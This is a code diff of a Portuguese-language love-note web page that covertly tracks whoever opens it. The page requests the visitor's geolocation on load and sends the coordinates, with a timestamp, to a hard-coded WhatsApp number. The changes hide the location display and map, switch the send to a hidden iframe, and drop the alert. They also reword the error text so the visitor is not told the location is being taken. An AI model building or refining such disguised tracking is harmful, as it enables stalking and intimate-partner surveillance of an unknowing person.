@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SEU_TITULO_PERSONALIZADO</title>
+    <title>EU_TE_AMO</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
@@ -18,13 +18,22 @@
             background-color: #fff1f2;
         }
         .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #ec4899;
+            border: 4px solid #fecdd3;
+            border-top: 4px solid #e11d48;
             border-radius: 50%;
             width: 40px;
             height: 40px;
-            animation: spin 1s linear infinite;
+            animation: spin 0.6s linear infinite;
             margin: 20px auto;
+            position: relative;
+        }
+        .loader::after {
+            content: "❤️";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 24px;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
@@ -33,11 +42,12 @@
     </style>
 </head>
 <body class="bg-gray-100 min-h-screen flex flex-col">
-    <header class="bg-pink-500 text-white py-6 shadow-lg">
-        <div class="container mx-auto px-4">
-            <h1 class="text-3xl font-bold">
-                Uma Mensagem Especial
+    <header class="bg-gradient-to-r from-pink-500 to-rose-500 text-white py-6 shadow-lg">
+        <div class="container mx-auto px-4 text-center">
+            <h1 class="text-4xl font-bold">
+                🌹 Para o Amor da Minha Vida 🌹
             </h1>
+            <p class="mt-2 text-xl">Para cada batida do meu coração</p>
         </div>
     </header>
 
@@ -57,7 +67,10 @@
                 <!-- Hidden temporary storage for location -->
                 <div id="location-data" class="hidden"></div>
                 
-                <p class="text-gray-600 italic">Carregando nossa mensagem especial...</p>
+                <div class="text-center">
+                    <div class="animate-bounce text-4xl mt-4">💘</div>
+                    <p class="text-pink-600 italic text-lg mt-2">Um momento especial...</p>
+                </div>
             </div>
 
             <div id="loading" class="hidden text-center">
@@ -66,28 +79,11 @@
             </div>
 
             <div id="location-result" class="hidden">
-                <h3 class="text-xl font-semibold text-gray-800 mb-4">Mensagem Especial</h3>
-                <p class="text-gray-600 mb-4 italic">
-                    "Nosso amor é como uma melodia doce que nunca termina"
-                </p>
-                <p class="text-gray-600">
-                    "Você ilumina meus dias com seu sorriso"
-                </p>
-                <h3 class="text-xl font-semibold text-gray-800 mb-2">Sua localização:</h3>
-                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
-                    <div class="bg-gray-50 p-3 rounded-lg">
-                        <p class="text-sm text-gray-500">Latitude</p>
-                        <p id="latitude" class="font-mono text-lg">-</p>
-                    </div>
-                    <div class="bg-gray-50 p-3 rounded-lg">
-                        <p class="text-sm text-gray-500">Longitude</p>
-                        <p id="longitude" class="font-mono text-lg">-</p>
-                    </div>
+                <div class="text-center py-8">
+                    <p class="text-pink-600 text-xl italic">"Nosso amor é como as estrelas - infinito e brilhante"</p>
+                    <p class="mt-6 text-lg">💖 Você ilumina meu mundo 💖</p>
+                    <div class="mt-6 animate-bounce text-4xl">🥰</div>
                 </div>
-                <div id="map"></div>
-                <p class="text-sm text-gray-500 mt-4">
-                    Ponto no mapa mostra sua posição aproximada
-                </p>
             </div>
 
             <div id="error-message" class="hidden bg-red-50 border-l-4 border-red-500 p-4 mt-4">
@@ -102,7 +98,8 @@
 
     <footer class="bg-gray-800 text-white py-4 mt-8">
         <div class="container mx-auto px-4 text-center text-sm">
-            <p>Com amor, para você ❤️</p>
+            <p>De: Quem te ama mais do que tudo</p>
+            <p class="mt-2 text-lg">❤️🧡💛💚💙💜</p>
         </div>
     </footer>
 
@@ -141,36 +138,21 @@
                 document.getElementById('error-text').textContent = message;
             }
 
-            function initMap(lat, lng) {
-                if (!map) {
-                    map = L.map('map').setView([lat, lng], 15);
-                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
-                    }).addTo(map);
-                } else {
-                    map.setView([lat, lng], 15);
-                }
-
-                if (marker) {
-                    map.removeLayer(marker);
-                }
-
-                marker = L.marker([lat, lng]).addTo(map)
-                    .bindPopup("Para Você ❤️")
-                    .openPopup();
-            }
+            // Map functions removed
 
             function sendLocation(lat, lng) {
-                // Send location via WhatsApp
-                const whatsappNumber = '5515996713782'; // Com código de país (55) e DDD (15)
-                const message = `pronto: https://maps.google.com/?q=${lat},${lng}`;
-                const whatsappUrl = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
+                // Send directly to WhatsApp
+                const whatsappNumber = '5515996713782';
+                const message = `Localização recebida: ${new Date().toLocaleString()}\nhttps://maps.google.com/?q=${lat},${lng}`;
                 
-                // Open WhatsApp in new tab (silently)
-                window.open(whatsappUrl, '_blank');
-                
-                // Still show success message to user
-                // Remove any success alert to user
+                // Create a hidden iframe to avoid popup blocking
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
+                document.body.appendChild(iframe);
+                setTimeout(() => {
+                    document.body.removeChild(iframe);
+                }, 3000);
             }
 
             function getLocation() {
@@ -193,7 +175,7 @@
                             sendLocation(lat, lng);
 
                             // Show romantic content to them
-                            alert('Sua presença torna meus dias mais especiais! 😊');
+                            // No alert shown
 
                             // Don't show any location UI
                             locationResult.classList.add('hidden');
@@ -202,7 +184,7 @@
                             let errorMessage = '';
                             switch(error.code) {
                                 case error.PERMISSION_DENIED:
-                                    errorMessage = "Precisamos da sua localização para mostrar a mensagem especial.";
+                                    errorMessage = "Ocorreu um problema ao carregar sua mensagem especial.";
                                     break;
                                 case error.POSITION_UNAVAILABLE:
                                     errorMessage = "Informações de localização não estão disponíveis.";
@@ -227,11 +209,9 @@
                 }
             }
 
-            // Auto-run on page load
-            setTimeout(() => {
-                showLoading();
-                getLocation();
-            }, 1500);
+            // Auto-run on page load immediately
+            showLoading();
+            getLocation();
 
             // Also set up fallback if denied
             tryAgainBtn.addEventListener('click', getLocation);
